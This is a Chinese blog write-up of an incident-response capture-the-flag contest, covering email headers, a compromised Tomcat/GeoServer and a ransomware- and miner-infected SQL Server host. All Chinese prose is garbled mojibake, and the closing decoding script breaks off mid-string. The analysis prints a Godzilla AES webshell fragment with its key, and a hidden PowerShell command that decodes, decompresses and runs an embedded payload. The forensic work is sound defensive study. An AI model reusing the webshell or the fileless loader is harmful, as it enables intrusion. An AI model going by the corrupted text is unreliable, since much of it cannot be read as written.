---
title: ç¬¬ä¸€å±Šsolaræ¯Â·åº”æ€¥å“åº”æŒ‘æˆ˜èµ› éƒ¨åˆ†WP
date: '2025-01-09 09:58:32'
updated: '2025-01-10 10:08:41'
excerpt: ç¬¬ä¸€å±Šsolaræ¯Â·åº”æ€¥å“åº”æŒ‘æˆ˜èµ› éƒ¨åˆ†WP
tags:
  - ç½‘ç»œå®‰å…¨
  - åº”æ€¥å“åº”
categories:
  - ç½‘ç»œå®‰å…¨
permalink: /post/the-first-solar-cup-emergency-response-challenge-part-wp-zvl0ij.html
comments: true
toc: true
---

â€

**å®˜æ–¹é¢˜è§£**ï¼š[mp.weixin.qq.com/s/kMvwfBJgd7ugaWzm5U-5Ww](https://mp.weixin.qq.com/s/kMvwfBJgd7ugaWzm5U-5Ww)

**ç¬”è€…**ï¼šAgony

## ç­¾åˆ°é¢˜

ã€€ã€€**é¢˜ç›®ï¼š**

ã€€ã€€æœ¬é¢˜ä½œä¸ºç­¾åˆ°é¢˜,è¯·ç»™å‡ºé‚®æœå‘ä»¶é¡ºåºã€‚

```
Received: from mail.da4s8gag.com ([140.143.207.229])
by newxmmxszc6-1.qq.com (NewMX) with SMTP id 6010A8AD
for ; Thu, 17 Oct 2024 11:24:01 +0800
X-QQ-mid: xmmxszc6-1t1729135441tm9qrjq3k
X-QQ-XMRINFO: NgToQqU5s31XQ+vYT/V7+uk=
Authentication-Results: mx.qq.com; spf=none smtp.mailfrom=;
dkim=none; dmarc=none(permerror) header.from=solar.sec
Received: from mail.solar.sec (VM-20-3-centos [127.0.0.1])
by mail.da4s8gag.com (Postfix) with ESMTP id 2EF0A60264
for ; Thu, 17 Oct 2024 11:24:01 +0800 (CST)
Date: Thu, 17 Oct 2024 11:24:01 +0800
To: hellosolartest@qq.com
From: éå¬ªç«¶ç¼ƒæˆœä¿Š
Subject:xxxxxxxxxx
Message-Id: <20241017112401.032146@mail.solar.sec>
X-Mailer: QQMail 2.x

XXXXXXXXXX
```

1. **é‚®ä»¶æœ€åˆå‘é€**ï¼š

    * é‚®ä»¶ä» **mail.solar.sec** æœåŠ¡å™¨ï¼ˆIP åœ°å€ 127.0.0.1ï¼Œè¡¨ç¤ºæœ¬åœ°å‘é€ï¼‰å‘é€é‚®ä»¶ï¼Œä½¿ç”¨ ESMTP åè®®é€šè¿‡ **Postfix** è¿›è¡Œå¤„ç†ã€‚
    * æ—¶é—´æˆ³ï¼šThu, 17 Oct 2024 11:24:01 +0800 (CST)

    ```
    Received: from mail.solar.sec (VM-20-3-centos [127.0.0.1])
    by mail.da4s8gag.com (Postfix) with ESMTP id 2EF0A60264
    for ; Thu, 17 Oct 2024 11:24:01 +0800 (CST)
    ```
2. **é‚®ä»¶è½¬å‘**ï¼š

    * æ¥ç€ï¼Œé‚®ä»¶è¢«ä» **mail.da4s8gag.com**ï¼ˆIP åœ°å€ 140.143.207.229ï¼‰è½¬å‘åˆ° **newxmmxszc6-1.qq.com**ã€‚
    * è¿™ä¸ªé‚®ä»¶æœåŠ¡å™¨å°†é‚®ä»¶è¿›ä¸€æ­¥å¤„ç†ï¼Œå¹¶å®‰æ’å°†é‚®ä»¶å‘é€ç»™æœ€ç»ˆçš„æ¥æ”¶é‚®ç®±ã€‚
    * æ—¶é—´æˆ³ä¹Ÿæ˜¯ Thu, 17 Oct 2024 11:24:01 +0800ã€‚

    ```
    Received: from mail.da4s8gag.com ([140.143.207.229])
    by newxmmxszc6-1.qq.com (NewMX) with SMTP id 6010A8AD
    for ; Thu, 17 Oct 2024 11:24:01 +0800
    ```

* é‚®ä»¶çš„å‘é€å’Œè½¬å‘ç¡®å®å‘ç”Ÿåœ¨åŒä¸€æ—¶é—´ï¼ˆ11:24:01 +0800ï¼‰ï¼Œè¿™æ„å‘³ç€å®ƒæ˜¯åœ¨è¾ƒçŸ­çš„æ—¶é—´å†…å®Œæˆçš„ã€‚
* é¦–å…ˆï¼Œç”± **mail.solar.sec** å‘é€é‚®ä»¶ï¼Œç„¶åè¢« **mail.da4s8gag.com** æ¥æ”¶ï¼Œæœ€åç”± **newxmmxszc6-1.qq.com** è¿›è¡Œè¿›ä¸€æ­¥çš„å¤„ç†æˆ–è½¬å‘ã€‚

ã€€ã€€æ‰€ä»¥ï¼Œflagçš„ç»“æœä¸ºï¼š

```
flag{mail.solar.sec|mail.da4s8gag.com|newxmmxszc6-1.qq.com}
```

## æµé‡åˆ†æ

ã€€ã€€æœ¬é¢˜ç¯å¢ƒï¼š

â€‹![image](https://cdn.jsdelivr.net/gh/AgonySec/Picture/siyuan/image-20250109101103-wi2735d.png)â€‹

### æ–‡ä»¶æ’æŸ¥

ã€€ã€€**é¢˜ç›®ï¼š** <span data-type="text" style="background-color: var(--b3-font-background1);">æ–°æ‰‹è¿ç»´å°ç‹çš„Geoserveré­åˆ°äº†æ”»å‡»ï¼š
é»‘å®¢ç–‘ä¼¼åˆ é™¤äº†webshellåé—¨ï¼Œå°ç‹æ‰¾åˆ°äº†å¯èƒ½æ˜¯æ”»å‡»ç—•è¿¹çš„æ–‡ä»¶ä½†ä¸ä¸€å®šæ˜¯æ­£ç¡®çš„ï¼Œè¯·å¸®ä»–æ’æŸ¥ä¸€ä¸‹ã€‚</span>

ã€€ã€€â€

ã€€ã€€**è§£ç­”ï¼š**

ã€€ã€€è¿™ç§webæ—¥å¿—ï¼Œå¯ä»¥ä½¿ç”¨æˆ‘è‡ªå·±å†™çš„webæ—¥å¿—åˆ†æå·¥å…·ï¼Œçœ‹çœ‹æƒ…å†µï¼š

â€‹![image](https://cdn.jsdelivr.net/gh/AgonySec/Picture/siyuan/image-20250109105813-rvfbgvk.png)â€‹

ã€€ã€€å‘ç°ï¼Œæ”»å‡»ipï¼š`10.0.100.22 `â€‹ çš„ä¸€äº›æ‰«æè¡Œä¸ºï¼Œå¹¶ä¸”éƒ½å¤±è´¥äº†

â€‹![image](https://cdn.jsdelivr.net/gh/AgonySec/Picture/siyuan/image-20250109105850-1ytwk9n.png)â€‹

ã€€ã€€æ²¡ä»€ä¹ˆæ”¶è·ï¼Œæ‰‹åŠ¨æŸ¥ä¸€ä¸‹æ—¥å¿—ï¼Œæ—¥å¿—æ–‡ä»¶**â€‹`localhost_access_log.2024-12-16.txt`â€‹**â€‹ï¼š

â€‹![image](https://cdn.jsdelivr.net/gh/AgonySec/Picture/siyuan/image-20250109110121-ncoo62v.png)â€‹

ã€€ã€€å‘ç°è·Ÿb.jspäº¤äº’é¢‘ç¹ï¼Œå¹¶ä¸”éƒ½æ˜¯postè¯·æ±‚ï¼Œè€Œä¸”éƒ½æ˜¯200çŠ¶æ€ç ï¼æ„å‘³ç€æ‰§è¡ŒæˆåŠŸã€‚ğŸ§

ã€€ã€€å›åˆ°ä¸Šä¸€ä¸ªæ—¥æœŸçš„æ—¥å¿—æ–‡ä»¶ï¼Œå‘ç°è®¿é—®b.jspæœ€æ—©åœ¨` 2024:23:31:49`â€‹

â€‹![image](https://cdn.jsdelivr.net/gh/AgonySec/Picture/siyuan/image-20250109110534-cidgq0w.png)â€‹

ã€€ã€€æ ¹æ®è®¿é—®ç›®å½•æ‰¾ä¸€ä¸‹webshellï¼Œå‘ç°æœç„¶æ²¡æœ‰äº†ï¼Œåº”è¯¥æ˜¯webshellè¢«åˆ äº†

â€‹![image](https://cdn.jsdelivr.net/gh/AgonySec/Picture/siyuan/image-20250109110441-rkg7bf9.png)â€‹

ã€€ã€€è¿™é‡Œè¡¥å……ä¸€ä¸‹çŸ¥è¯†ï¼š

ã€€ã€€åœ¨ Apache Tomcat çš„è¿è¡Œç¯å¢ƒä¸­ï¼Œ`work/Catalina/localhost/ROOT/`â€‹ ç›®å½•é€šå¸¸æ˜¯ç”¨äºå­˜æ”¾ JSP æ–‡ä»¶çš„ç¼–è¯‘äº§ç‰©çš„ä¸´æ—¶ç›®å½•ã€‚å½“æ”»å‡»è€…ä¸Šä¼  WebShellï¼ˆé€šå¸¸æ˜¯ä»¥ `.jsp`â€‹ ä¸ºåç¼€çš„æ–‡ä»¶ï¼‰æ—¶ï¼ŒTomcat ä¼šè‡ªåŠ¨å°†ä¸Šä¼ çš„ JSP æ–‡ä»¶ç¼–è¯‘ä¸º Java æºæ–‡ä»¶ï¼ˆ`.java`â€‹ï¼‰ï¼Œå¹¶è¿›ä¸€æ­¥ç¼–è¯‘ä¸ºå­—èŠ‚ç æ–‡ä»¶ï¼ˆ`.class`â€‹ï¼‰ï¼Œæœ€ç»ˆç”¨äºæ‰§è¡Œã€‚

ã€€ã€€â€

ã€€ã€€æŸ¥çœ‹ä¸´æ—¶ç›®å½•ï¼Œå‘ç°webshellçš„Java æºæ–‡ä»¶ï¼ˆåº”è¯¥å°±æ˜¯è¿™ä¸ª`b.jsp`â€‹ï¼‰ï¼Œæ ¹æ®ç‰¹å¾åˆ¤æ–­ä¸º`å“¥æ–¯æ‹‰AESé©¬`â€‹ã€‚

```
apache-tomcat-9.0.96\work\Catalina\localhost\ROOT\org\apache\jsp\b_jsp.java
```

â€‹![image](https://cdn.jsdelivr.net/gh/AgonySec/Picture/siyuan/image-20250109101906-pzuht3f.png)â€‹

ã€€ã€€æœ¨é©¬ç‰¹å¾ï¼š

```powershell
 String code="ZiFsXmEqZ3tBN2I0X1g5ektfMnY4Tl93TDVxNH0="; String xc="a2550eeab0724a69"; class X extends ClassLoader{public X(ClassLoader z){super(z);}public Class Q(byte[] cb){return super.defineClass(cb, 0, cb.length);} }public byte[] x(byte[] s,boolean m){ try{javax.crypto.Cipher c=javax.crypto.Cipher.getInstance("AES");c.init(m?1:2,new javax.crypto.spec.SecretKeySpec(xc.getBytes(),"AES"));return c.doFinal(s); }catch (Exception e){return null; }}

```

ã€€ã€€è·Ÿgslçš„**â€‹`JAVA_AES_RAW`â€‹**â€‹  æœ¨é©¬ webshellç‰¹å¾ä¸€è‡´ï¼š

ã€€ã€€ä¸‹é¢æ˜¯å“¥æ–¯æ‹‰é»˜è®¤çš„webshellï¼š

â€‹![image](https://cdn.jsdelivr.net/gh/AgonySec/Picture/siyuan/image-20250109102732-fw3xwx3.png)â€‹

ã€€ã€€â€‹`flag`â€‹ä¸ºcodeçš„`base64`â€‹è§£ç ã€‚è¿™é“é¢˜å¯ä»¥ç›´æ¥ä½¿ç”¨Dç›¾ç­‰webshellæŸ¥æ€å·¥å…·æ‰¾åˆ°webshell

â€‹![image](https://cdn.jsdelivr.net/gh/AgonySec/Picture/siyuan/image-20250109111202-591zzqx.png)â€‹

```powershell
f!l^a*g{A7b4_X9zK_2v8N_wL5q4}
```

### æµé‡è§£å¯†

ã€€ã€€**é¢˜ç›®ï¼š**

ã€€ã€€*æ–°æ‰‹è¿ç»´å°ç‹çš„Geoserveré­åˆ°äº†æ”»å‡»ï¼š*

ã€€ã€€*å°ç‹æ‹¿åˆ°äº†å½“æ—¶è¢«å…¥ä¾µæ—¶çš„æµé‡ï¼Œå…¶ä¸­ä¸€ä¸ªIPæœ‰è®¿é—®webshellçš„æµé‡ï¼Œå·²æå–éƒ¨åˆ†æ”¾åœ¨äº†ä¸¤ä¸ªpcapngä¸­äº†ã€‚è¯·å¸®ä»–è§£å¯†è¯¥æµé‡ã€‚*

ã€€ã€€**è§£ç­”ï¼š**

ã€€ã€€ä½¿ç”¨wiresharkæ‰“å¼€æµé‡åŒ…

ã€€ã€€æŸ¥çœ‹ä¸ b.jsp äº¤äº’çš„ httpæµé‡ï¼š

â€‹![image](https://cdn.jsdelivr.net/gh/AgonySec/Picture/siyuan/image-20250109141206-gkks6yv.png)â€‹

ã€€ã€€flagå­˜åœ¨æ•°æ®åŒ…åœ¨ `7230 `â€‹ä½ç½®ï¼š

â€‹![image](https://cdn.jsdelivr.net/gh/AgonySec/Picture/siyuan/image-20250109140049-lxh3ncz.png)â€‹

ã€€ã€€å› ä¸ºå·²çŸ¥æ˜¯å“¥æ–¯æ‹‰çš„`JAVA_AES_RAW`â€‹çš„payloadï¼Œå¯ä»¥é€šè¿‡é¢˜ç›®1çŸ¥é“`xc=a2550eeab0724a69`â€‹ï¼Œè§£å¯†æ—¶éœ€è¦å¤åˆ¶å¯†æ–‡çš„åå…­è¿›åˆ¶ï¼Œç„¶åä½¿ç”¨AESè§£å¯†ï¼Œæœ€åä½¿ç”¨`Gunzip()`â€‹è§£å‹ç¼©ï¼Œå› ä¸ºå“¥æ–¯æ‹‰ä¼ è¾“æ•°æ®æ—¶ä½¿ç”¨`Gunzip`â€‹å‹ç¼©ã€‚è¿”å›åŒ…ä¸éœ€è¦å»æ‰å‰åçš„16ä½ã€‚

ã€€ã€€å°†åŸå§‹æ•°æ®æ‹¿åˆ°cyberchef ä¸Šå»åˆ†æï¼š

ã€€ã€€cybercheféœ€è¦è®¾ç½®å¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œè®°å¾—è¦è®¾ç½®`Gunzip()`â€‹ï¼š

â€‹![image](https://cdn.jsdelivr.net/gh/AgonySec/Picture/siyuan/image-20250109113935-svd9z84.png)â€‹

ã€€ã€€æ‹¿ä¸‹flagï¼š

```powershell
flag{sA4hP_89dFh_x09tY_lL4SI4}
```

### æ–‡ä»¶æå–

> *æ–°æ‰‹è¿ç»´å°ç‹çš„Geoserveré­åˆ°äº†æ”»å‡»ï¼š*
>
> *å°ç‹æ‹¿åˆ°äº†å½“æ—¶è¢«å…¥ä¾µæ—¶çš„æµé‡ï¼Œé»‘å®¢ç–‘ä¼¼é€šè¿‡webshellä¸Šä¼ äº†æ–‡ä»¶ï¼Œè¯·çœ‹çœ‹é‡Œé¢æ˜¯ä»€ä¹ˆã€‚*
>
> ä½¿ç”¨æµé‡è§£å¯†å·¥å…·è¿›è¡Œè§£å¯†æµé‡å¹¶åˆ é™¤æ— ç”¨éƒ¨åˆ†åå¦å­˜ä¸ºpdfã€‚

ã€€ã€€çœ‹æµé‡ï¼Œå‘ç°è¿™å—æµé‡å¾ˆå¤§ï¼Œæ‹¿å‡ºæ¥è§£å¯†ä¸€ä¸‹

â€‹![image](https://cdn.jsdelivr.net/gh/AgonySec/Picture/siyuan/image-20250109145708-u05huc0.png)â€‹

ã€€ã€€è§£å¯†å¦‚ä¸‹ï¼Œåº”è¯¥ä¸Šä¼ äº†pdfæ–‡ä»¶ï¼š

â€‹![image](https://cdn.jsdelivr.net/gh/AgonySec/Picture/siyuan/image-20250109145754-nymlcbe.png)â€‹

ã€€ã€€æ ¹æ®é¢˜æ„æ‰€çŸ¥ï¼Œå°†æ•°æ®åº“å¯¼å‡ºä¸ºpdfï¼š

â€‹![image](https://cdn.jsdelivr.net/gh/AgonySec/Picture/siyuan/image-20250109145912-e5r0k0j.png)â€‹

ã€€ã€€æ‰“å¼€pdfï¼Œæ‹¿ä¸‹flagï¼š

â€‹![image](https://cdn.jsdelivr.net/gh/AgonySec/Picture/siyuan/image-20250109150006-lape9bl.png)â€‹

```powershell
flag{dD7g_jk90_jnVm_aPkcs}
```

## æ•°æ®åº“

ã€€ã€€*è¯´æ˜ï¼šç”±äºé»‘å®¢åœ¨æ”»å‡»æ—¶å¯èƒ½ä¼šä¿®æ”¹ç”¨æˆ·å£ä»¤ã€é”å®šç™»é™†ã€ç ´åç³»ç»Ÿå¯¼è‡´æ— æ³•è¿›å…¥æ“ä½œç³»ç»Ÿï¼Œå› æ­¤æœ¬é¢˜ä¸æä¾›å¯†ç *

ã€€ã€€VMwareè™šæ‹Ÿæœºè¿›å…¥PEç³»ç»Ÿï¼š

> PEé•œåƒä¸‹è½½åœ°å€
>
> https://www.hotpe.top/download/

ã€€ã€€â€

ã€€ã€€PEé•œåƒä¸‹è½½åœ°å€

ã€€ã€€[https://www.hotpe.top/download/](https://www.wepe.com.cn/download.html)

ã€€ã€€å…ˆä¸‹ä¸ªpeå·¥å…·ç®±ï¼Œç„¶ååˆ¶ä½œPEé•œåƒ

ã€€ã€€â€

ã€€ã€€åœ¨åŸDç›˜å‘ç°äº†è¯¥å‹’ç´¢ç—…æ¯’ç•™ä¸‹çš„è¯´æ˜ï¼š

â€‹![image](https://cdn.jsdelivr.net/gh/AgonySec/Picture/siyuan/image-20250109165759-fcbed72.png)â€‹

ã€€ã€€æ–‡ä»¶éƒ½è¢« X3rmENR07åç¼€åŠ å¯†äº†ï¼š

â€‹![image](https://cdn.jsdelivr.net/gh/AgonySec/Picture/siyuan/image-20250109165957-8hm9xl4.png)â€‹

ã€€ã€€è¯¥åç¼€æ˜¯lockbitå®¶æ—çš„ç—…æ¯’

â€‹![image](https://cdn.jsdelivr.net/gh/AgonySec/Picture/siyuan/image-20250109165928-waz2r52.png)â€‹

### **æ”»å‡»è€…åˆ›å»ºéšè—è´¦æˆ·çš„æ—¶é—´**

ã€€ã€€å…ˆé€šè¿‡peæ¸…ç©ºä¸€ä¸‹ç™»å½•å¯†ç ï¼ŒæˆåŠŸç™»å½•ç³»ç»Ÿï¼š

ã€€ã€€â€

â€‹![image](https://cdn.jsdelivr.net/gh/AgonySec/Picture/siyuan/image-20250109171510-3qenxic.png)â€‹

ã€€ã€€æ’æŸ¥windowsæ—¥å¿—ï¼Œæ‰¾securityæ—¥å¿—å°±å¥½äº†ï¼ŒæŠŠæ—¥å¿—æ‹¿å‡ºæ¥ï¼Œä¸Šå·¥å…·æ’æŸ¥ï¼Œ1ç§’ä¸åˆ°å¤„ç†å®Œäº†ï¼š

â€‹![image](https://cdn.jsdelivr.net/gh/AgonySec/Picture/siyuan/image-20250109171948-qq5ntff.png)â€‹

ã€€ã€€çœ‹çœ‹ç»“æœï¼Œç­›é€‰ `4720`â€‹ï¼ˆä»£è¡¨**åˆ›å»ºç”¨æˆ·**ï¼‰ çš„æ—¥å¿—ï¼š

â€‹![image](https://cdn.jsdelivr.net/gh/AgonySec/Picture/siyuan/image-20250109172150-i2u0h7q.png)â€‹

ã€€ã€€æˆåŠŸæ’æŸ¥åˆ°è¿™ä¸ªæ—¥å¿—ï¼Œè¿™ä¸ª`test$`â€‹ç”¨æˆ·å°±æ˜¯é»‘å®¢åˆ›å»ºçš„ï¼Œæ—¶é—´ä¸ºï¼š2024-12-16T15:24:21+08:00ï¼Œ

ã€€ã€€æ”¹ä¸ºflagæ ¼å¼å°±æ˜¯ï¼š

```powershell
flag{2024/12/16 15:24:21}
```

### æ¶æ„æ–‡ä»¶çš„åç§°

ã€€ã€€ç›´æ¥æ‰“å¼€æ–‡ä»¶ç®¡ç†å™¨ï¼Œä¸€çœ¼æŒ–çŸ¿ç—…æ¯’ï¼š

â€‹![image](https://cdn.jsdelivr.net/gh/AgonySec/Picture/siyuan/image-20250109172609-jvj5uz1.png)â€‹

ã€€ã€€å½“ç„¶ä¹Ÿå¯ä»¥ç”¨å…¶ä»–å·¥å…·æ¥æ’æŸ¥ï¼Œ360ï¼Œç«ç»’ç­‰ç­‰

```powershell
flag{xmrig.exe}
```

### å¤–è”åœ°å€

ã€€ã€€å®šä½åˆ°æŒ–çŸ¿æœ¨é©¬æ–‡ä»¶åœ°å€ï¼Œæ‰¾åˆ°è¿™ä¸ªconfig.jsonæ–‡ä»¶ï¼š

â€‹![image](https://cdn.jsdelivr.net/gh/AgonySec/Picture/siyuan/image-20250109173103-tksjiyx.png)â€‹

ã€€ã€€çŸ¿æ± åœ°å€urlå¦‚ä¸‹ï¼šsierting.com

â€‹![image](https://cdn.jsdelivr.net/gh/AgonySec/Picture/siyuan/image-20250109173139-340o263.png)â€‹

ã€€ã€€DNSåœ¨çº¿è§£æå‡ºipåœ°å€ï¼š203.107.45.167

â€‹![image](https://cdn.jsdelivr.net/gh/AgonySec/Picture/siyuan/image-20250109173242-0eqdwsg.png)â€‹

```powershell
flag{203.107.45.167}
```

### æ•°æ®åº“ä¿®å¤

ã€€ã€€ä½¿ç”¨æ•°æ®åº“ä¿®å¤å·¥å…· **D-Recovery SQL Server** è¿›è¡Œä¿®å¤

ã€€ã€€é€‰æ‹©è¢«åŠ å¯†çš„æ•°æ®åº“æ–‡ä»¶ï¼Œåœ¨â€œé€‰æ‹©å‚ç…§mdfæ–‡ä»¶â€æŒ‰é’®ä¸­é€‰æ‹©â€œã€éé¢˜ç›®ã€‘mssqlé¢˜-å¤‡ä»½æ•°æ®åº“ï¼ˆå¯èƒ½ä¼šç”¨åˆ°ï¼‰â€ä¸­çš„çº¯è¡¨ç»“æ„æ–‡ä»¶

ã€€ã€€çœç•¥ã€‚ã€‚ã€‚ã€‚

ã€€ã€€â€

ã€€ã€€ä¸»æœºæ„ŸæŸ“äº†å‹’ç´¢ç—…æ¯’ï¼Œç”±äºåŠ å¯†ç¨‹åºå¯èƒ½åªå¯¹æ–‡ä»¶éƒ¨åˆ†å†…å®¹è¿›è¡Œç¯¡æ”¹ï¼Œåˆ™å¯èƒ½åœ¨æ•°æ®åº“æ–‡ä»¶æ¢å¤åˆ°éƒ¨åˆ†æ•°æ®ã€‚é€šè¿‡åˆ†ææ•°æ®åº“çš„æœ¬åœ°æ–‡ä»¶`C:\Program Files\Microsoft SQL Server\MSSQL13.MSSQLSERVER\MSSQL\DATA\*`â€‹ã€‚

â€‹![image](https://cdn.jsdelivr.net/gh/AgonySec/Picture/siyuan/image-20250109235225-te85ie7.png)â€‹

ã€€ã€€åœ¨tempdb\_mssql\_3.ndf.X3rmENR07å‘ç°flagã€‚

â€‹![image](https://cdn.jsdelivr.net/gh/AgonySec/Picture/siyuan/image-20250109235730-524cob6.png)â€‹

```powershell
flag{E4r5t5y6Mhgur89g}
```

ã€€ã€€â€

ã€€ã€€â€

### é€†å‘æ¶æ„powoshellçš„md5å€¼

ã€€ã€€å¯ä»¥åœ¨â€œWindows PowerShell.evtxâ€æ—¥å¿—æ–‡ä»¶ä¸­çœ‹åˆ°PowerShellæ‰§è¡Œæƒ…å†µï¼Œä½¿ç”¨å·¥å…·åˆ†æç»“æœï¼š

â€‹![image](https://cdn.jsdelivr.net/gh/AgonySec/Picture/siyuan/image-20250109222732-gqievtr.png)â€‹

ã€€ã€€å¯ä»¥çœ‹åˆ°æ”»å‡»è€…åœ¨2024/12/16 15:23:01æ‰§è¡Œçš„PowerShellå…¶ä¸­çš„

ã€€ã€€**New-Object System.IO.MemoryStream** ï¼šç”¨äº Base64 ç¼–ç çš„å­—ç¬¦ä¸²åˆ›å»ºå†…å­˜æµã€‚

ã€€ã€€**System.IO.Compression.GzipStream** ï¼šè§£å‹ç¼© Gzip ç¼–ç çš„æ•°æ®æµã€‚

ã€€ã€€**ReadToEnd()**  ï¼šè¯»å–å¹¶æ‰§è¡Œè§£å‹åçš„æ•°æ®å†…å®¹ã€‚

â€‹![image](https://cdn.jsdelivr.net/gh/AgonySec/Picture/siyuan/image-20250109222806-rh09f1e.png)â€‹

```powershell
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -nop -w hidden -c &([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String((('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{0}')-f'A','f','M')))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))
```

ã€€ã€€â€

ã€€ã€€è§£å¯†è„šæœ¬å¦‚ä¸‹ï¼š

```
import base64

base64_data = '''H4sICBPmW2cAA3Rlc3QudHh0ALVXbXOiSBD+7q+gtqwSKkYwcXNuqrbqQFExkpWgGHWtKwIDzDKAC0OU7O1/vx58SVJJdvfuaucLzkx3T8/TT3ePXh47FCcxR2ch963C7cfYTu2I46uhpNe5anG3Fo5bVe9sw33k+KW8XneTyMbx6vKyk6cpiulu3ugjKmcZiu4IRhkvcH9zswCl6PTT3RfkUO4bV/2r0SfJnU32YkXHdgLEncqxy/ZGiWMzpxrmmmDK1z5/rgnL0+aqoX7NbZLxNbPIKIoaLiE1gfsusAMnxRrxNR07aZIlHm3McHx+1pjGme2ha7B2j3REg8TNakLleJcU0TyNyysxGzsJvgY/x2niyK6boiyr1bkls75crf7kl/ujb/KY4gg1tJiiNFmbKL3HDsoaAzt2CbpB3gq0TJri2F8JAojdJyHiq3FOSJ37N2b4a7Q5APerSvxTJZAa01SoQzRfXlNP3JygnWLtFT8ZAQQYexIIle+VinegDLEC7f1L0hznh7EsNxA4y4+TDJe6Hzmpzulwrk2TtIBpdZLmSFgdoeaq9+2rdv0XjTUPmqAXL2Y6LC2tBLuro/6TqFfXbZcwibcZ3EUejlG3iO0IOweS8q/FAnkElXA0DmLX4B5f228gt4sI8m3K4GWUeKGmRpgedZUcExelsgPxzMArCLXw3JldxPiaFusoAuh2c+Bo1YPUQAfpfToUh9PZHIRqHWJnWZ0b55CbTp0zkU2QW+fkOMP7LTmnSfmz9uiunhOKHTujB3Mr4Tma+1M7SZzRNHcgpoDAxFwjB9uEAVLnBthFSmFi/3B67VU4OjYhkDRg6R7CASsMBpMypqTgaMkKoWEiqkVrgiKQKUtFj9g+FIZ9apTUsn3k1l7385ABO7ozXA6APPESgm2ShNY5C6cU6g7DmHHrvzjxouKUznRStA8NX2bWUiko436VThdRydA9PiUaKQUkemkSKXaGLlq74sK/E1XcfT/uJg8yDLV3Y1iKOZ36W4ksiKlRc67i0TQINNzU/MlkMIS1Yqr6Yyqtr8zuQE6728CTtUxTB0phNBXZGeA/rKEynYIe7oyML1tNdpXIv/XnnY02Dm41OKgz8jUfvooWOIq0kHxF0qjWV82R0VGGIG+0mgtNbJNr3SEKfjA1Ux7M2HmGMxh27S2co7Zag9vtRL7Wh3LQ++T2mme9QMWSHJrGwFiE/VFXLecOmxvzTMVqb25YAQJbxsxaKzO1tzCsteafbHzDGomtXqDAuoa3o7Upwmg2h/ex+6CT9oMO7hrWYojRQvNR4cuGLJvzmJh3m44s9z9srnB+rvamsBZOtHhr3K11t5gPxA+WjtE6kQ1VlnsEMjSS7U1XbM6SK8N6b0xVaVtMpe1G/SJuVDzchPvvtH9x4YteayxaphYP7EABf4thK8TDE9iLbEuae6LF8OuEsfgQ35KLoV5iCvcxQAezeNn+DejtdGQaa7eiaPmiL3vE0vy24d8m8Zkdgu2ZL4O